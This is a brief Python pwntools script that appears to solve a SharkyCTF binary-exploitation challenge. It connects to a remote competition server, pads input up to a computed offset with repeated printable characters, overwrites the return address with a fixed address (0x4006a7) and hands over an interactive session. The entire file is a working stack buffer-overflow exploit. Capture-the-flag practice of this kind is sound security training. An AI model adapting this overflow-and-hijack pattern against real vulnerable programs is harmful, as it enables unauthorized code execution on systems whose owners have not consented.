from pwn import *

# p = process('./main')
p = remote('sharkyctf.xyz', 20333)

# input("attach")

import string
s = string.printable

payload = b"".join([bytes(i*4,'utf-8') for i in s])

index = payload.index(b"aaaa")
payload = payload[:index]
payload += p64(0x4006a7)

p.sendline(payload)

p.interactive()